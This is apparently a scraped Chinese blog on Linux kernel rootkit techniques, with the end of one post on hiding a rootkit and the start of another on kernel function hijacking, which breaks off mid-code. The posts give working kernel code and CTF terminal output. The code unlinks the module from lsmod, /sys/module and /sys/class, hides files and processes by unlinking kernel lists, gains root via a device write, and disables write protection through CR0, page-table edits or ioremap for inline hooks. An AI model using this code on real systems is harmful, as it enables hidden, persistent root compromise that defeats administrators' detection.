mod_kallsyms __rcu *kallsyms;\tstruct mod_kallsyms core_kallsyms;\t/* Section attributes */\tstruct module_sect_attrs *sect_attrs;\t/* Notes attributes */\tstruct module_notes_attrs *notes_attrs;#endif\t/* The command line arguments (may be mangled).  People like\t   keeping pointers to this stuff */\tchar *args;#ifdef CONFIG_SMP\t/* Per-cpu data. */\tvoid __percpu *percpu;\tunsigned int percpu_size;#endif\tvoid *noinstr_text_start;\tunsigned int noinstr_text_size;#ifdef CONFIG_TRACEPOINTS\tunsigned int num_tracepoints;\ttracepoint_ptr_t *tracepoints_ptrs;#endif#ifdef CONFIG_TREE_SRCU\tunsigned int num_srcu_structs;\tstruct srcu_struct **srcu_struct_ptrs;#endif#ifdef CONFIG_BPF_EVENTS\tunsigned int num_bpf_raw_events;\tstruct bpf_raw_event_map *bpf_raw_events;#endif#ifdef CONFIG_DEBUG_INFO_BTF_MODULES\tunsigned int btf_data_size;\tvoid *btf_data;#endif#ifdef CONFIG_JUMP_LABEL\tstruct jump_entry *jump_entries;\tunsigned int num_jump_entries;#endif#ifdef CONFIG_TRACING\tunsigned int num_trace_bprintk_fmt;\tconst char **trace_bprintk_fmt_start;#endif#ifdef CONFIG_EVENT_TRACING\tstruct trace_event_call **trace_events;\tunsigned int num_trace_events;\tstruct trace_eval_map **trace_evals;\tunsigned int num_trace_evals;#endif#ifdef CONFIG_FTRACE_MCOUNT_RECORD\tunsigned int num_ftrace_callsites;\tunsigned long *ftrace_callsites;#endif#ifdef CONFIG_KPROBES\tvoid *kprobes_text_start;\tunsigned int kprobes_text_size;\tunsigned long *kprobe_blacklist;\tunsigned int num_kprobe_blacklist;#endif#ifdef CONFIG_HAVE_STATIC_CALL_INLINE\tint num_static_call_sites;\tstruct static_call_site *static_call_sites;#endif#if IS_ENABLED(CONFIG_KUNIT)\tint num_kunit_suites;\tstruct kunit_suite **kunit_suites;#endif#ifdef CONFIG_LIVEPATCH\tbool klp; /* Is this a livepatch module? */\tbool klp_alive;\t/* ELF information */\tstruct klp_modinfo *klp_info;#endif#ifdef CONFIG_PRINTK_INDEX\tunsigned int printk_index_size;\tstruct pi_entry **printk_index_start;#endif#ifdef CONFIG_MODULE_UNLOAD\t/* What modules depend on me? */\tstruct list_head source_list;\t/* What modules do I depend on? */\tstruct list_head target_list;\t/* Destruction function. */\tvoid (*exit)(void);\tatomic_t refcnt;#endif#ifdef CONFIG_CONSTRUCTORS\t/* Constructor functions. */\tctor_fn_t *ctors;\tunsigned int num_ctors;#endif#ifdef CONFIG_FUNCTION_ERROR_INJECTION\tstruct error_injection_entry *ei_funcs;\tunsigned int num_ei_funcs;#endif#ifdef CONFIG_DYNAMIC_DEBUG_CORE\tstruct _ddebug_info dyndbg_info;#endif&#125; ____cacheline_aligned __randomize_layout;\n\n里面包含了module信息的一些成员，并且多个内核模块是通过上面结构体中的list成员构成的双向链表结构。\nmodule_class = class_create(THIS_MODULE, CLASS_NAME);if (IS_ERR(module_class))&#123;  unregister_chrdev(major_num, DEVICE_NAME);  return PTR_ERR(module_class);&#125;\n\n在lkm编程中，可以注意到的时候这里创建class时使用THIS_MODULE定位了当前的模块，展开其定义其实就是(&amp;__this_module)。\nextern struct module __this_module;#define THIS_MODULE (&amp;__this_module)\n\n前面提到/proc/modules的内容来自内核中上述的双向链表结构中，所以如果我们让我们的rootkit脱链即可完成隐藏操作。\n可以注意到的是这里的list成员定义的结构是list_head结构，而该类型的成员在以往的内核文章中应该介绍过可以使用list_del_rcu函数直接进行删除，不过这里是内核环境所以考虑多线程操作的影响是必要的。\nSYSCALL_DEFINE2(delete_module, const char __user *, name_user,\t\tunsigned int, flags)&#123;\tstruct module *mod;\tchar name[MODULE_NAME_LEN];\tchar buf[MODULE_FLAGS_BUF_SIZE];\tint ret, forced = 0;\tif (!capable(CAP_SYS_MODULE) || modules_disabled)\t\treturn -EPERM;\tif (strncpy_from_user(name, name_user, MODULE_NAME_LEN-1) &lt; 0)\t\treturn -EFAULT;\tname[MODULE_NAME_LEN-1] = &#x27;\\0&#x27;;\taudit_log_kern_module(name);\tif (mutex_lock_interruptible(&amp;module_mutex) != 0)\t\treturn -EINTR;\tmod = find_module(name);\tif (!mod) &#123;\t\tret = -ENOENT;\t\tgoto out;\t&#125;\tif (!list_empty(&amp;mod-&gt;source_list)) &#123;\t\t/* Other modules depend on us: get rid of them first. */\t\tret = -EWOULDBLOCK;\t\tgoto out;\t&#125;\t/* Doing init or already dying? */\tif (mod-&gt;state != MODULE_STATE_LIVE) &#123;\t\t/* FIXME: if (force), slam module count damn the torpedoes */\t\tpr_debug(&quot;%s already dying\\n&quot;, mod-&gt;name);\t\tret = -EBUSY;\t\tgoto out;\t&#125;\t/* If it has an init func, it must have an exit func to unload */\tif (mod-&gt;init &amp;&amp; !mod-&gt;exit) &#123;\t\tforced = try_force_unload(flags);\t\tif (!forced) &#123;\t\t\t/* This module can&#x27;t be removed */\t\t\tret = -EBUSY;\t\t\tgoto out;\t\t&#125;\t&#125;\tret = try_stop_module(mod, flags, &amp;forced);\tif (ret != 0)\t\tgoto out;\tmutex_unlock(&amp;module_mutex);\t/* Final destruction now no one is using it. */\tif (mod-&gt;exit != NULL)\t\tmod-&gt;exit();\tblocking_notifier_call_chain(&amp;module_notify_list,\t\t\t\t     MODULE_STATE_GOING, mod);\tklp_module_going(mod);\tftrace_release_mod(mod);\tasync_synchronize_full();\t/* Store the name and taints of the last unloaded module for diagnostic purposes */\tstrscpy(last_unloaded_module.name, mod-&gt;name, sizeof(last_unloaded_module.name));\tstrscpy(last_unloaded_module.taints, module_flags(mod, buf, false), sizeof(last_unloaded_module.taints));\tfree_module(mod);\t/* someone could wait for the module in add_unformed_module() */\twake_up_all(&amp;module_wq);\treturn 0;out:\tmutex_unlock(&amp;module_mutex);\treturn ret;&#125;\n\n上述代码是rmmod背后调用的系统调用delete_module的内部实现。\nstatic void free_module(struct module *mod)&#123;\ttrace_module_free(mod);\tmod_sysfs_teardown(mod);\t/*\t * We leave it in list to prevent duplicate loads, but make sure\t * that noone uses it while it&#x27;s being deconstructed.\t */\tmutex_lock(&amp;module_mutex);\tmod-&gt;state = MODULE_STATE_UNFORMED;\tmutex_unlock(&amp;module_mutex);\t/* Arch-specific cleanup. */\tmodule_arch_cleanup(mod);\t/* Module unload stuff */\tmodule_unload_free(mod);\t/* Free any allocated parameters. */\tdestroy_params(mod-&gt;kp, mod-&gt;num_kp);\tif (is_livepatch_module(mod))\t\tfree_module_elf(mod);\t/* Now we can delete it from the lists */\tmutex_lock(&amp;module_mutex);\t/* Unlink carefully: kallsyms could be walking list. */\tlist_del_rcu(&amp;mod-&gt;list);\tmod_tree_remove(mod);\t/* Remove this module from bug list, this uses list_del_rcu */\tmodule_bug_cleanup(mod);\t/* Wait for RCU-sched synchronizing before releasing mod-&gt;list and buglist. */\tsynchronize_rcu();\tif (try_add_tainted_module(mod))\t\tpr_err(&quot;%s: adding tainted module to the unloaded tainted modules list failed.\\n&quot;,\t\t       mod-&gt;name);\tmutex_unlock(&amp;module_mutex);\t/* This may be empty, but that&#x27;s OK */\tmodule_arch_freeing_init(mod);\tkfree(mod-&gt;args);\tpercpu_modfree(mod);\tfree_mod_mem(mod);&#125;\n\n可以看到这里使用的是list_del_rcu函数直接对其进行脱链操作，尽管其是rcu安全的在前后也都是加了锁保平安的。\n所以我们在实现脱链操作时也需要进行相应的加锁操作。\nstatic int rootkit_init(void)&#123;  // ... ...\t\tstruct list_head *list = (&amp;__this_module.list);    mutex_lock(&amp;module_mutex);    list-&gt;prev-&gt;next = list-&gt;next;    list-&gt;next-&gt;prev = list-&gt;prev;    mutex_unlock(&amp;module_mutex);  // ... ...&#125;\n\n这里在init时做一下操作即可实现脱链操作。\n~ $ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)~ $ lsmod ~ $ echo a &gt; /dev/rootkit ~ # iduid=0(root) gid=0(root) groups=1000(ctf)~ # lsmod ~ # cat /proc/modules | grep &#x27;rootkit&#x27;~ # \n\n发现无论是lsmod还是直接查看/proc/modules文件都无法查看到rootkit相关信息了，但是依旧不会影响我们提权操作。需要注意的是，我们在前面的delete_module系统调用中提到在正常卸载一个模块时是需要脱链操作的，所以这个模块无法将其卸载了。\n/sys/module/信息隐藏sysfs与procfs相类似，同样是一个基于RAM的虚拟文件系统，它的作用是将内核信息以文件的方式提供给用户程序使用，其中便包括我们的 rootkit 模块信息，sysfs 会动态读取内核中的 kobject 层次结构并在 /sys/module/ 目录下生成文件。\n~ $ ls /sys/module/8250                intel_idle          shpchpacpi                intel_pmc_core      slab_commonacpi_cpufreq        ipv6                spuriousacpiphp             kdb                 sr_modapparmor            kernel              srcutreeata_generic         keyboard            suspendata_piix            kgdb_nmi            sysrqbattery             kgdboc              tcp_cubicblk_cgroup          libata              thermalblk_crypto          libnvdimm           tpmblock               loop                tpm_crbbutton              md_mod              tpm_tisconfigfs            module              tpm_tis_corecpufreq             mousedev            uhci_hcdcpuidle             netpoll             usbcorecrc_t10dif          nmi_backtrace       uv_nmicryptomgr           page_alloc          vfiodebug_core          pata_sis            vfio_iommu_type1device_hmem         pcc_cpufreq         vfio_pcidm_mod              pci_hotplug         vfio_virqfddns_resolver        pcie_aspm           virtio_mmiodynamic_debug       pciehp              virtio_pciedac_core           ppp_generic         virtual_rootedd                 printk              vtefivars             processor           watchdogehci_hcd            pstore              workqueueeisa_bus            random              xenfb                  rcupdate            xen_acpi_processorfirmware_class      rcutree             xen_blkfrontfscrypto            rfkill              xen_netfrontfuse                rng_core            xhci_hcdgpiolib_acpi        rootkit             xz_dechaltpoll            rtc_cmos            zswapi8042               scsi_modima                 sg~ $ \n\nKobject 是 Linux 中的设备数据结构基类，在内核中为 struct kobject 结构体，通常内嵌在其他数据结构中；每个设备都有一个 kobject 结构体，多个 kobject 间通过内核双向链表进行链接；kobject 之间构成层次结构。\nstruct kobject &#123;\tconst char\t\t*name;\tstruct list_head\tentry;\tstruct kobject\t\t*parent;\tstruct kset\t\t*kset;\tconst struct kobj_type\t*ktype;\tstruct kernfs_node\t*sd; /* sysfs directory entry */\tstruct kref\t\tkref;\tunsigned int state_initialized:1;\tunsigned int state_in_sysfs:1;\tunsigned int state_add_uevent_sent:1;\tunsigned int state_remove_uevent_sent:1;\tunsigned int uevent_suppress:1;#ifdef CONFIG_DEBUG_KOBJECT_RELEASE\tstruct delayed_work\trelease;#endif&#125;;\n\n可以看到的是同样是存在一个成员entry是list_head结构的。\nstatic void __kobject_del(struct kobject *kobj)&#123;\tstruct kernfs_node *sd;\tconst struct kobj_type *ktype;\tsd = kobj-&gt;sd;\tktype = get_ktype(kobj);\tsysfs_remove_groups(kobj, ktype-&gt;default_groups);\t/* send &quot;remove&quot; if the caller did not do it but sent &quot;add&quot; */\tif (kobj-&gt;state_add_uevent_sent &amp;&amp; !kobj-&gt;state_remove_uevent_sent) &#123;\t\tpr_debug(&quot;&#x27;%s&#x27; (%p): auto cleanup &#x27;remove&#x27; event\\n&quot;,\t\t\t kobject_name(kobj), kobj);\t\tkobject_uevent(kobj, KOBJ_REMOVE);\t&#125;\tsysfs_remove_dir(kobj);\tsysfs_put(sd);\tkobj-&gt;state_in_sysfs = 0;\tkobj_kset_leave(kobj);\tkobj-&gt;parent = NULL;&#125;void kobject_del(struct kobject *kobj)&#123;\tstruct kobject *parent;\tif (!kobj)\t\treturn;\tparent = kobj-&gt;parent;\t__kobject_del(kobj);\tkobject_put(parent);&#125;EXPORT_SYMBOL(kobject_del);\n\n虽然形式同前面一致，不过这是却是直接在__kobject_del函数中使用了sysfs_remove_dir来删除文件夹，其内部实现就是删除掉当前kobject结构体的sd指针（即super block）。\nkobject_del(&amp;__this_module.mkobj.kobj);\n\n根据上面的含义来说我们只需调用这一个kobject_del函数即可实现/sys/module/信息隐藏了。\n~ $ ls /sys/module/ | grep rootfs~ $ lsmod~ $ cat /proc/modules | grep rookit~ $ ls /sys/module/ | grep rootkit~ $ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)~ $ echo a &gt; /dev/rootkit ~ # iduid=0(root) gid=0(root) groups=1000(ctf)~ # \n\n/sys/class/信息隐藏我们在创建 /dev/ 设备文件接口时创建了一个 class，而这可以被在 /sys/class 目录下发现，因此我们还需要完成对 class 的隐藏。\n~ $ ls /sys/class/ata_device     dma_heap       mdio_bus       ptp            spi_slaveata_link       dmi            mem            pwm            thermalata_port       extcon         misc           rapidio_port   tpmbacklight      firmware       mmc_host       regulator      tpmrmbdi            gpio           nd             remoteproc     ttyblock          graphics       net            rfkill         usb_rolebsg            hwmon          pci_bus        rootkit_class  vcdax            i2c-adapter    pci_epc        rtc            vfiodevcoredump    i2c-dev        phy            scsi_device    virtio-portsdevfreq        input          power_supply   scsi_disk      vtconsoledevfreq-event  intel_scu_ipc  powercap       scsi_generic   wakeupdevlink        iommu          ppp            scsi_host      watchdogdma            leds           pps            spi_master~ $ \n\nvoid kset_unregister(struct kset *k)&#123;\tif (!k)\t\treturn;\tkobject_del(&amp;k-&gt;kobj);\tkobject_put(&amp;k-&gt;kobj);&#125;EXPORT_SYMBOL(kset_unregister);void class_unregister(struct class *cls)&#123;\tpr_debug(&quot;device class &#x27;%s&#x27;: unregistering\\n&quot;, cls-&gt;name);\tclass_remove_groups(cls, cls-&gt;class_groups);\tkset_unregister(&amp;cls-&gt;p-&gt;subsys);&#125;void class_destroy(struct class *cls)&#123;\tif ((cls == NULL) || (IS_ERR(cls)))\t\treturn;\tclass_unregister(cls);&#125;\n\n这里粗略的查看一下class_destroy的基本流程会发现其是通过kobject_del函数进行删除的，所以这里其实可以和/sys/module/进行隐藏时的操作一样即可。\nkobject_del(&amp;(((struct kset *)module_class-&gt;p)-&gt;kobj));\n\n~ $ ls /sys/class/ | grep rootkit~ $ \n\n最终实现隐藏。\n文件隐藏在前文中，在创建设备后可以在/dev目录中看到设备，并且我们的rootkit需要长期驻留在系统中，如果想每一次开机都自动载入我们的rootkit，这也就要求我们的rootkit文件还需要保留在系统中。所以接下来需要我们进行文件隐藏了。\n在linux中我们最常用的便利文件夹的命令是ls，这里追踪一下ls所使用了什么系统调用\n// ... ...openat(AT_FDCWD, &quot;.&quot;, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3fstat(3, &#123;st_mode=S_IFDIR|0755, st_size=832, ...&#125;) = 0getdents64(3, /* 26 entries */, 32768)  = 904getdents64(3, /* 0 entries */, 32768)   = 0close(3)                                = 0fstat(1, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...&#125;) = 0write(1, &quot;busybox-1.36.1\\texp.c  linux-5.11&quot;..., 189busybox-1.36.1\texp.c  linux-5.11  Makefile  modules.order  Module.symvers  rootfs  rootfs.cpio  rootkit.c  rootkit.ko\trootkit.mod  rootkit.mod.c  rootkit.mod.o  rootkit.o  x) = 189close(1)                                = 0close(2)                                = 0exit_group(0)                           = ?+++ exited with 0 +++\n\n前面大多是glibc库的许多系统调用比如创建内存等所以这里省略了，从这里开始，能够注意到的是这里存在getdents64这样一个系统调用。\nSYSCALL_DEFINE3(getdents64, unsigned int, fd,\t\tstruct linux_dirent64 __user *, dirent, unsigned int, count)&#123;\tstruct fd f;\tstruct getdents_callback64 buf = &#123;\t\t.ctx.actor = filldir64,\t\t.count = count,\t\t.current_dir = dirent\t&#125;;\tint error;\tf = fdget_pos(fd);\tif (!f.file)\t\treturn -EBADF;\terror = iterate_dir(f.file, &amp;buf.ctx);\tif (error &gt;= 0)\t\terror = buf.error;\tif (buf.prev_reclen) &#123;\t\tstruct linux_dirent64 __user * lastdirent;\t\ttypeof(lastdirent-&gt;d_off) d_off = buf.ctx.pos;\t\tlastdirent = (void __user *) buf.current_dir - buf.prev_reclen;\t\tif (put_user(d_off, &amp;lastdirent-&gt;d_off))\t\t\terror = -EFAULT;\t\telse\t\t\terror = count - buf.count;\t&#125;\tfdput_pos(f);\treturn error;&#125;\n\n在内核中查看其源码可以看到第一个参数就是一个文件描述符，所以前面传入的3即openat当前目录所得到的文件描述符。\n回到上述代码，其中的fdget_pos函数和fdput_pos函数对应的是对文件描述符进行加锁和解锁的操作，这里主要的实现函数是iterate_dir。\nint iterate_dir(struct file *file, struct dir_context *ctx)&#123;\tstruct inode *inode = file_inode(file);\tbool shared = false;\tint res = -ENOTDIR;\tif (file-&gt;f_op-&gt;iterate_shared)\t\tshared = true;\telse if (!file-&gt;f_op-&gt;iterate)\t\tgoto out;\tres = security_file_permission(file, MAY_READ);\tif (res)\t\tgoto out;\tif (shared)\t\tres = down_read_killable(&amp;inode-&gt;i_rwsem);\telse\t\tres = down_write_killable(&amp;inode-&gt;i_rwsem);\tif (res)\t\tgoto out;\tres = -ENOENT;\tif (!IS_DEADDIR(inode)) &#123;\t\tctx-&gt;pos = file-&gt;f_pos;\t\tif (shared)\t\t\tres = file-&gt;f_op-&gt;iterate_shared(file, ctx);\t\telse\t\t\tres = file-&gt;f_op-&gt;iterate(file, ctx);\t\tfile-&gt;f_pos = ctx-&gt;pos;\t\tfsnotify_access(file);\t\tfile_accessed(file);\t&#125;\tif (shared)\t\tinode_unlock_shared(inode);\telse\t\tinode_unlock(inode);out:\treturn res;&#125;EXPORT_SYMBOL(iterate_dir)\n\nLinux系统可以适用于不同的文件系统的原因就是中间存在一层VFS层，在内核中使用file结构体来表示一个文件，而每个文件都有一张函数表 file_operations 函数表对应相应的对该文件的相关操作（例如 read、write），该函数表取自该文件对应的 inode，最终取自相应的文件系统提供的具体函数，在这里会调用表中的函数指针 iterate_shared 或 iterate。\n\n使用gdb简单调试发现Linux-5.10版本内核会调用interate_shared函数，继续调试会发现其最终调用dcache_readdir函数。\nint dcache_readdir(struct file *file, struct dir_context *ctx)&#123;\tstruct dentry *dentry = file-&gt;f_path.dentry;\tstruct dentry *cursor = file-&gt;private_data;\tstruct list_head *anchor = &amp;dentry-&gt;d_subdirs;\tstruct dentry *next = NULL;\tstruct list_head *p;\tif (!dir_emit_dots(file, ctx))\t\treturn 0;\tif (ctx-&gt;pos == 2)\t\tp = anchor;\telse if (!list_empty(&amp;cursor-&gt;d_child))\t\tp = &amp;cursor-&gt;d_child;\telse\t\treturn 0;\twhile ((next = scan_positives(cursor, p, 1, next)) != NULL) &#123;\t\tif (!dir_emit(ctx, next-&gt;d_name.name, next-&gt;d_name.len,\t\t\t      d_inode(next)-&gt;i_ino, dt_type(d_inode(next))))\t\t\tbreak;\t\tctx-&gt;pos++;\t\tp = &amp;next-&gt;d_child;\t&#125;\tspin_lock(&amp;dentry-&gt;d_lock);\tif (next)\t\tlist_move_tail(&amp;cursor-&gt;d_child, &amp;next-&gt;d_child);\telse\t\tlist_del_init(&amp;cursor-&gt;d_child);\tspin_unlock(&amp;dentry-&gt;d_lock);\tdput(next);\treturn 0;&#125;EXPORT_SYMBOL(dcache_readdir);\n\n可以注意到的是函数内部会通过scan_positives进行遍历获得next，最后通过dir_emit提交给vfs层。\nstatic struct dentry *scan_positives(struct dentry *cursor,\t\t\t\t\tstruct list_head *p,\t\t\t\t\tloff_t count,\t\t\t\t\tstruct dentry *last)&#123;\tstruct dentry *dentry = cursor-&gt;d_parent, *found = NULL;\tspin_lock(&amp;dentry-&gt;d_lock);\twhile ((p = p-&gt;next) != &amp;dentry-&gt;d_subdirs) &#123;\t\tstruct dentry *d = list_entry(p, struct dentry, d_child);\t\t// we must at least skip cursors, to avoid livelocks\t\tif (d-&gt;d_flags &amp; DCACHE_DENTRY_CURSOR)\t\t\tcontinue;\t\tif (simple_positive(d) &amp;&amp; !--count) &#123;\t\t\tspin_lock_nested(&amp;d-&gt;d_lock, DENTRY_D_LOCK_NESTED);\t\t\tif (simple_positive(d))\t\t\t\tfound = dget_dlock(d);\t\t\tspin_unlock(&amp;d-&gt;d_lock);\t\t\tif (likely(found))\t\t\t\tbreak;\t\t\tcount = 1;\t\t&#125;\t\tif (need_resched()) &#123;\t\t\tlist_move(&amp;cursor-&gt;d_child, p);\t\t\tp = &amp;cursor-&gt;d_child;\t\t\tspin_unlock(&amp;dentry-&gt;d_lock);\t\t\tcond_resched();\t\t\tspin_lock(&amp;dentry-&gt;d_lock);\t\t&#125;\t&#125;\tspin_unlock(&amp;dentry-&gt;d_lock);\tdput(last);\treturn found;&#125;\n\n通过对scan_positives函数的分析会发现其首先(p = p-&gt;next) != &amp;dentry-&gt;d_subdirs判断是否已经遍历到本身，随后通过list_entry宏获得最终的dentry并返回的，这里使用的dentry中的d_child成员。\nstruct dentry &#123;\t/* RCU lookup touched fields */\tunsigned int d_flags;\t\t/* protected by d_lock */\tseqcount_spinlock_t d_seq;\t/* per dentry seqlock */\tstruct hlist_bl_node d_hash;\t/* lookup hash list */\tstruct dentry *d_parent;\t/* parent directory */\tstruct qstr d_name;\tstruct inode *d_inode;\t\t/* Where the name belongs to - NULL is\t\t\t\t\t * negative */\tunsigned char d_iname[DNAME_INLINE_LEN];\t/* small names */\t/* Ref lookup also touches following */\tstruct lockref d_lockref;\t/* per-dentry lock and refcount */\tconst struct dentry_operations *d_op;\tstruct super_block *d_sb;\t/* The root of the dentry tree */\tunsigned long d_time;\t\t/* used by d_revalidate */\tvoid *d_fsdata;\t\t\t/* fs-specific data */\tunion &#123;\t\tstruct list_head d_lru;\t\t/* LRU list */\t\twait_queue_head_t *d_wait;\t/* in-lookup ones only */\t&#125;;\tstruct list_head d_child;\t/* child of parent list */\tstruct list_head d_subdirs;\t/* our children */\t/*\t * d_alias and d_rcu can share memory\t */\tunion &#123;\t\tstruct hlist_node d_alias;\t/* inode alias list */\t\tstruct hlist_bl_node d_in_lookup_hash;\t/* only for in-lookup ones */\t \tstruct rcu_head d_rcu;\t&#125; d_u;&#125; __randomize_layout;\n\n可能前面直接说dentry结构体会比较模糊，最好结合着这个结构体以及注释来看。\n\n结合上图相信大家可以很快的理解到了。\n所以在这里我们可以将一个文件的dentry从其d_child链表中脱链，就能够实现隐藏操作了。\nstatic void hide_file(const char *filename)&#123;    struct file *tagret_file = NULL;    struct dentry *target_dentry;    tagret_file = filp_open(filename, O_RDONLY, 0);    if (!IS_ERR(tagret_file))    &#123;        target_dentry = tagret_file-&gt;f_path.dentry;        target_dentry-&gt;d_child.next-&gt;prev = target_dentry-&gt;d_child.prev;        target_dentry-&gt;d_child.prev-&gt;next = target_dentry-&gt;d_child.next;        filp_close(tagret_file, NULL);    &#125;&#125;\n\n可以通过上述代码实现脱链操作。\n~ $ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)~ $ lsbin          home         lib64        root         sysdev          init         linuxrc      rootfs.cpio  usretc          lib          proc         sbin~ $ ls /dev/ | grep rootkit~ $ echo a &gt; /dev/rootkit~ # iduid=0(root) gid=0(root) groups=1000(ctf)~ # find /dev/ -name &quot;rootkit&quot;~ # lsbin          home         lib64        root         sysdev          init         linuxrc      rootfs.cpio  usretc          lib          proc         sbin~ # \n\n可以看到最终成功隐藏掉了/dev/rootkit以及根目录的rootkit.ko并且并不会影响其正常功能。\n进程隐藏提权的最终目的都是让我们的某一个进程拥有root权限，一个root权限的进程向交于处于内核态的模块来说可以做的事情更多，不过这个进程也是存在被发现的风险，所以接下来需要进行进程隐藏。\n首先，众所周知Linux kernel中的PCB其实是task_struct结构体，多个 task_struct 之间相互连接成双向链表结构，若是运维人员选择遍历 task_struct 链表便很容易发现我们的恶意进程，因此我们需要将我们的进程从 task_struct 链表中摘除。\n同样的，运维人员若是遍历 /proc/pid ，甚至是直接遍历所有进程号，则很容易发现我们的恶意进程，因此我们还需要将其从 pid 链表中摘除。\nstatic long rootkit_ioctl(struct file *__file, unsigned int cmd, unsigned long param)&#123;    struct task_struct *task;    struct hlist_node *cur_node;    spin_lock(&amp;current-&gt;sighand-&gt;siglock);    cur_node = &amp;current-&gt;pid_links[PIDTYPE_PID];    list_del_rcu(&amp;current-&gt;tasks);    INIT_LIST_HEAD(&amp;current-&gt;tasks);    hlist_del_rcu(cur_node);    INIT_HLIST_NODE(cur_node);    cur_node-&gt;pprev = &amp;cur_node;    spin_unlock(&amp;current-&gt;sighand-&gt;siglock);    return 0;&#125;\n\n这里使用上述代码即可删除当前进程的pid。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123;    int fd = open(&quot;/dev/rootkit&quot;, 2);    if (fd &lt; 0)    &#123;        printf(&quot;faild open rootkit!&quot;);        exit(0);    &#125;    ioctl(fd, 0, 0);    sleep(200);&#125;\n\n最后编写一个用于测试的用户进程。\n~ $ ./exp&amp;~ $ psPID   USER     TIME  COMMAND    1 root      0:01 &#123;init&#125; /bin/sh /init kaslr  # ... ...  140 ctf       0:00 sh  142 ctf       0:00 ps~ $ \n\n最终成功实现进程隐藏。\n","categories":["Linux Kernel"],"tags":["LKM"]},{"title":"Linux Rootkit现代技术分析","url":"/2024/06/03/Linux-Rootkit%E7%8E%B0%E4%BB%A3%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"前言由于懒狗症发作加上每天沉迷游戏导致很久没有更新文章了，其实上一篇的Rootkit其实都是残缺版但是不想继续写了就直接加了个入门两个字就发出来了😴。这一篇文章主要是在上一篇文章的基础上进行一系列的拓展以及补充，目前看来也是最后一篇关于rootkit的文章。\n已经是玩了几个月了，文章只字未动。懒狗的醒悟！\n函数劫持rootkit作为存在于Linux内核态，这也意味着rootkit拥有着超级高的权限，在需要完成一些特定的目的时可以通过修改内核中函数来完成。例如在需要进行文件隐藏时可以通过修改getdents函数来实现。\n修改只读内存这里简单分析三种方法来修改内核中只读内存段。\n方法一：修改cr0寄存器\n只读保护的开关其实是由cr0寄存器中的write protect位决定的，所以这里只需要将cr0寄存器的这一位置0即可关闭只读保护，从而改写内存中只读区域的数据。\nsize_t rootkit_read_cr0(void)&#123;    size_t cr0;    asm volatile(        &quot;movq  %%cr0, %%rax;&quot;        &quot;movq  %%rax, %0;   &quot;        : &quot;=r&quot;(cr0)::&quot;%rax&quot;);    return cr0;&#125;void rootkit_write_cr0(size_t cr0)&#123;    asm volatile(        &quot;movq   %0, %%rax;  &quot;        &quot;movq  %%rax, %%cr0;&quot; ::&quot;r&quot;(cr0) : &quot;%rax&quot;);&#125;void rootkit_disable_write_protect(void)&#123;    size_t cr0_val;    cr0_val = rootkit_read_cr0();    if ((cr0_val &gt;&gt; 16) &amp; 1)    &#123;        cr0_val &amp;= ~(1 &lt;&lt; 16);        rootkit_write_cr0(cr0_val);    &#125;&#125;void rootkit_enable_write_protect(void)&#123;    size_t cr0_val;    cr0_val = rootkit_read_cr0();    if (!((cr0_val &gt;&gt; 16) &amp; 1))    &#123;        cr0_val |= (1 &lt;&lt; 16);        rootkit_write_cr0(cr0_val);    &#125;&#125;void rootkit_write_read_only_mem_by_cr0(void *dst, void *src, size_t len)&#123;    size_t orig_cr0;    orig_cr0 = rootkit_read_cr0();    rootkit_disable_write_protect();    memcpy(dst, src, len);    if ((orig_cr0 &gt;&gt; 16) &amp; 1)    &#123;        rootkit_enable_write_protect();    &#125;&#125;\n\n方法二：直接修改内核页表项\n在内核中管理内存页使用的是页表，因为是对页进行管理的缘故，所以内存地址都是按照4K对齐的，意味着在pte中的64位只需要24位来对物理地址进行标识，其余的位只标识当前页框的属性并且当前页框是否可写也被标识在其中。\n因此我们想要对只读内存进行修改可以直接修改掉其对应页表项的R/W标识位即可。\n#include &lt;asm/pgtable_types.h&gt;void rootkit_write_romem_by_pte_patch(void *dst, void *src, size_t len)&#123;    pte_t *dst_pte;    pte_t orig_pte_val;    unsigned int level;    dst_pte = lookup_address((unsigned long) dst, &amp;level);    orig_pte_val.pte = dst_pte-&gt;pte;    dst_pte-&gt;pte |= _PAGE_RW;    memcpy(dst, src, len);    dst_pte-&gt;pte = orig_pte_val.pte;&#125;\n\n方法三：通过ioremap实现物理内存直接改写\n这里ioremap函数的作用是将物理地址重新映射到一个虚拟地址上。\nvoid rootkit_write_read_only_mem_by_ioremap(void *dst, void *src, size_t len)&#123;    size_t dst_phys_page_addr, dst_offset;    size_t dst_ioremap_addr;    dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;    dst_offset = (size_t)dst &amp; 0xfff;    dst_ioremap_addr = (size_t)ioremap(dst_phys_page_addr, len + 0x1000);    memcpy(dst_ioremap_addr + dst_offset, src, len);    iounmap(dst_ioremap_addr);&#125;\n\n这里通过virt_to_page和page_to_pfn两个函数找到需要修改的地址的物理地址，随后进行重新映射直接修改最后iounmap即可。\ninline hookinline hook即内联钩子是一种比较经典的思路，其核心原理是将函数中的hook点位修改为一个跳转指令，使其跳转至恶意代码处，在完成恶意代码执行之后恢复执行原本被跳转指令所覆盖掉的指令并最终跳转回原函数本该执行的指令，这样可以在不破坏原函数功能情况下完成恶意代码的执行。\n\n但是对于x86而言，其为CISC指令集，指令的长度是并不固定的，这也意味着我们在进行inline hook的时候不但需要将原指令patch为跳转指令，还需要保存和识别原有指令一遍在完成恶意代码执行后进行执行。\n动态inline hook技术这一技术是a3大佬给出的一种新的技术。其原理也较为简单，主要实现以下步骤即可：\n\n  保存将被hook点位上的数据（长度为跳转指令的长度）\n  修改hook点位为跳转指令，使程序执行流能够跳转到恶意函数\n  在恶意函数内部实现恢复hook点位的数据，随后调用hook点位\n  最后重新将hook点位的数据修改为跳转指令的长度，之后正常返回\n\n这种方式不会破坏函数调用栈并且也不需要对hook点位上的指令做识别。\n#define HOOK_BUF_SZ 0x30void rootkit_write_read_only_mem_by_ioremap(void *dst, void *src, size_t len)&#123;    size_t dst_phys_page_addr, dst_offset;    size_t dst_ioremap_addr;    dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;    dst_offset = (size_t)dst &amp; 0xfff;    